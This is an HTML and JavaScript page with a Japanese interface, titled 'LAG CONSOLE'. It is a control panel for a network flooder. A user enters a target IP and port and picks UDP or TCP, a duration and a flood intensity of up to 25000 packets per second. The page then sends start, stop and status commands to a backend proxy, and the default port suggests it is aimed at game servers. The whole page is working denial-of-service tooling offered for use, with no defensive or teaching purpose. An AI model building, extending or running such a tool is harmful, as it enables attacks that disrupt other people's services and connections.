<!doctype html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#0b0d10">
<title>LAG</title>
<style>
:root{--bg:#0b0d10;--panel:#14181d;--line:#232a32;--fg:#e8edf2;--dim:#8b97a3;--acc:#3ddc84;--warn:#ff6b6b}
*{box-sizing:border-box}
body{margin:0 auto;background:var(--bg);color:var(--fg);max-width:520px;padding:16px 14px 40px;
font:15px/1.5 -apple-system,BlinkMacSystemFont,"Hiragino Sans","Noto Sans JP",sans-serif}
h1{font-size:15px;letter-spacing:.18em;color:var(--dim);margin:0 0 14px;font-weight:600}
.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:14px;margin-bottom:12px}
label{display:block;font-size:12px;color:var(--dim);margin:0 0 6px}
input,select{width:100%;background:#0e1216;border:1px solid var(--line);color:var(--fg);border-radius:10px;
padding:13px 12px;font-size:16px;font-family:inherit;-webkit-appearance:none}
input:focus,select:focus{outline:none;border-color:#3a4652}
.row{display:flex;gap:10px;margin-bottom:12px}
.row>*{flex:1;min-width:0}
.chips{display:flex;gap:8px;flex-wrap:wrap}
.chip{flex:1;min-width:calc(50% - 8px);background:#0e1216;border:1px solid var(--line);color:var(--dim);
border-radius:10px;padding:11px 6px;font-size:13px;font-family:inherit}
.chip.sel{border-color:var(--acc);color:var(--acc)}
.act{display:flex;gap:10px;margin:16px 0 6px}
.act button{flex:1;border:0;border-radius:14px;padding:19px 8px;font-size:16px;font-weight:700;font-family:inherit}
#go{background:var(--acc);color:#04150c}
#stop{background:#20262d;color:var(--fg)}
button:disabled{opacity:.4}
.stat{display:grid;grid-template-columns:1fr 1fr;gap:8px;font-variant-numeric:tabular-nums}
.stat div{background:#0e1216;border-radius:10px;padding:10px}
.stat span{font-size:11px;color:var(--dim);letter-spacing:.08em}
.stat b{display:block;font-size:19px;margin-top:2px}
#log{font:12px/1.6 ui-monospace,Menlo,monospace;color:var(--dim);white-space:pre-wrap;max-height:140px;overflow:auto;margin-top:10px}
.on{color:var(--acc)}.off{color:var(--warn)}
.hint{font-size:11px;color:#5f6b77;margin:8px 0 0}
</style>
</head>
<body>
<h1>LAG CONSOLE</h1>
<div class="card">
  <div class="row">
    <div style="flex:1.7"><label for="host">ターゲットIP</label>
      <input id="host" inputmode="decimal" autocomplete="off" spellcheck="false" placeholder="203.0.113.24"></div>
    <div><label for="port">ポート</label><input id="port" inputmode="numeric" value="9339"></div>
  </div>
  <div class="row">
    <div><label for="proto">種類</label>
      <select id="proto"><option value="udp">UDP</option><option value="tcp">TCP</option></select></div>
    <div><label for="dur">秒数</label><input id="dur" inputmode="numeric" value="60"></div>
  </div>
  <label>強度</label>
  <div class="chips">
    <button class="chip" data-p="1000" data-s="256" data-w="2">弱</button>
    <button class="chip sel" data-p="4000" data-s="512" data-w="4">中</button>
    <button class="chip" data-p="12000" data-s="1024" data-w="8">強</button>
    <button class="chip" data-p="25000" data-s="1400" data-w="12">極</button>
  </div>
  <p class="hint" id="chosen">中：4000pps / 512B / 4本</p>
</div>
<div class="act">
  <button id="go">発射</button>
  <button id="stop" disabled>停止</button>
</div>
<div class="card">
  <div class="stat">
    <div><span>STATE</span><b id="state" class="off">IDLE</b></div>
    <div><span>SENT</span><b id="sent">0</b></div>
    <div><span>ELAPSED</span><b id="elapsed">0s</b></div>
    <div><span>REMAIN</span><b id="remain">0s</b></div>
  </div>
  <div id="log"></div>
</div>
<script>
const API='/.netlify/functions/proxy?path=';
const $=id=>document.getElementById(id);
let P=4000,S=512,W=4,poll=null;

function log(m){const d=$('log');d.textContent=(m+'\n'+d.textContent).slice(0,2000);}
async function call(p,m,b){
  const r=await fetch(API+encodeURIComponent(p),{method:m,headers:{'content-type':'application/json'},
    body:b?JSON.stringify(b):undefined});
  const t=await r.text();let j={};try{j=JSON.parse(t)}catch(e){j={raw:t}}
  if(!r.ok)throw new Error(j.error||('HTTP '+r.status));
  return j;
}
function paint(d){
  $('state').textContent=d.running?'LIVE':'IDLE';
  $('state').className=d.running?'on':'off';
  $('sent').textContent=d.sent||0;
  $('elapsed').textContent=(d.elapsed||0)+'s';
  $('remain').textContent=(d.remain||0)+'s';
  $('go').disabled=!!d.running;$('stop').disabled=!d.running;
}
document.querySelectorAll('.chip').forEach(c=>c.onclick=()=>{
  document.querySelectorAll('.chip').forEach(x=>x.classList.remove('sel'));
  c.classList.add('sel');P=+c.dataset.p;S=+c.dataset.s;W=+c.dataset.w;
  $('chosen').textContent=c.textContent+'：'+P+'pps / '+S+'B / '+W+'本';
});
$('go').onclick=async()=>{
  const host=$('host').value.trim();
  if(!/^\d{1,3}(\.\d{1,3}){3}$/.test(host))return log('IPの形式が違う');
  $('go').disabled=true;
  try{
    localStorage.setItem('h',host);localStorage.setItem('p',$('port').value);
    const d=await call('/start','POST',{host,port:+$('port').value,proto:$('proto').value,
      pps:P,size:S,workers:W,duration:+$('dur').value});
    log('START '+host+':'+d.port+' '+d.proto+' '+d.pps+'pps '+d.duration+'s');
    startPoll();
  }catch(e){log('ERR '+e.message);$('go').disabled=false;}
};
$('stop').onclick=async()=>{try{await call('/stop','POST');log('STOP')}catch(e){log('ERR '+e.message)};paint({running:false});};
function startPoll(){
  if(poll)return;
  poll=setInterval(async()=>{
    try{const d=await call('/status','GET');paint(d);if(!d.running){clearInterval(poll);poll=null;log('END');}}
    catch(e){clearInterval(poll);poll=null;log('LOST '+e.message);}
  },1500);
}
$('host').value=localStorage.getItem('h')||'';
$('port').value=localStorage.getItem('p')||'9339';
call('/status','GET').then(d=>{paint(d);if(d.running)startPoll()}).catch(()=>{});
</script>
</body>
</html>
